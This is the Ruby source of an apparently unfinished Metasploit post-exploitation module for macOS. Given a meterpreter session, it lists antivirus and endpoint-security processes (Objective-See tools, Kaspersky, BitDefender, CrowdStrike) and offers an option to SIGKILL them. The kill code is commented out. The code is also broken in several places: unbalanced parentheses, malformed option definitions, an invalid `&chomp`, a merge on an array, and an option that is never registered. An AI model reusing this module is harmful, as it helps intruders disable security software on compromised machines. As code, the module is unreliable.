##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Process
  include Msf::Post::File
  include Msf::Post::OSX::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        'OSX Antivirus Hunter' => 'OSX Antivirus Hunter: Enumerate and disable antivirus products',
        'Description' => %q{
          This module enumerates OSX systems for the presence of antivirus products. Target Products include: Objective-Cee, Kaspersky,
          BitDefender and CrowdStrike. Installation is determined via file artifiacts and processes. The CUSTOM_PRODS option specifies
          a file which contains a list of additional security products to hunt for, each of which will be seperated by a new
          line character. If run with root privilleges the KILL_PROCESSES option will send a kill signal to the security processes detected
          by this module.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'gardnerapp', 'cdelafuente-r7' ],
        'Platform' => [ 'osx' ],
        'SessionTypes' => 'meterpreter',
        'References' => [
          ['URL', 'https://objective-see.org/tools.html']
        ]
      )

  )
    register_options(
      [
        OptString.new('CUSTOM_PROCESSES',
                      true, [
                        'File containing process names to hunt for. Hunting is done grep wise, no need to be speciifc. Each value should
                             be seperated by a newline character'
                      ]),
        OptString.new('CUSTOM_FILES',
                      true, [
                        'File containing AV artifacts to hunt for, please include the full file path.Each value should be seperated by a
                             newline character'
                      ]),
        OptBool.new('KILL_PROCESSES', false['Send a SIGKILL signal to all of the processes this module finds, including custom processes.
                                             Root permissions are required. '])
      ]
    )
  end

  # Determine which products are installed and their pid if any
  # products arg is in array w each elem in the format of {:name => 'AV Name', :path => '/Applications/AV Name.app'}
  # returns a hash with keys of :name, :path, and :pid
  def enumerate_files(products)
    installed = []
    products.each { |prod| installed << prod if directory?(prod) || file?(prod) }
    installed
  end

  def objective_see
    ['LuLu', 'BlockBlock Helper', 'Do Not Disturb', 'ReiKey', 'RansomWhere', 'OverSight']
  end

  # Not sure what the file names of these products will be, needs more research.
  def kapersky
    ['kapersky']
  end

  def bitdefender
    ['bitdefender']
  end

  def crowdstrike
    ['crowdstrike']
  end

  # good canidate for an acessory method
  # reads a file and returns each line as an element in an array
  def file_to_array(file)
    f = File.open file
    f.readlines.map(&chomp)
  end

  def custom
    file_to_array datastore['CUSTOM_PRODS']
  end

  def all_products
    all = []
    %i[objective_see kapersky bitdefender crowdstrike custom].each { |p| all.merge p }
  end

  def enum_processes(product)
    @processes.each do |process|
      if process['name'] =~ /#{product}/i
        @running_process.push(process)
        print_good("Found potential process artifact #{process.inspect}")
      end
    end
  end

  def fail_if_not_root
    fail_with(Failure::BadConfig, 'Current session is not root. Please escelate privilleges before re-running this module.') unless is_root?
  end

  def run
    print_status('Retrieving process list...')
    @processes = get_processes

    print_status('Hunting processes for AV products...')

    relevant_processes = enum_processes(all_products)

    if datastore['CUSTOM_PROCESSES']
      print_status('Hunting for custom AV processes...')
      custom_processes = file_to_array datastore['CUSTOM_PROCESSES']
      relevant_processes.merge enum_processes(custom_processes)
    end

    #  av_files = []
    #  installed_files = enumerate_files av_files

    #  if datastore['CUSTOM_FILES']
    #   print_status('Hunting for custom AV files...')
    #  custom_files = file_to_array datastore['CUSTOM_FILES']
    # installed_files << enumerate_files custom_files
    # end

    # TODO: move this method after reporting the procesess.
    # if datastore['KILL_PROCESSES']
    # fail_if_not_root
    # installed,each do |process|
    # result = kill_process process['pid']
    # print_good("Kill signal for #{process['name']} #{pid} was successful") if result
    # end
    #  end

    # TODO: Going to take this out, abstract it to the enum_processes and enum_files methods. Going to report both

    # if prods.empty?
    # print_error('No AVproducts were found to be installed on the system.')
    # else
    # print_good('The following AV products were found installed on the system:')
    # prods.each { |prod| print_good("Found #{prod.name} with pid #{prod.pids.inspect}") }
    # end

    # installed_product = { 'installed products' => products.map(&:name).join(', ') }
    # report_note(host: target_host, type: 'osx.antivirus',
    #            data: installed_product, update: :unique_data)
  end
end
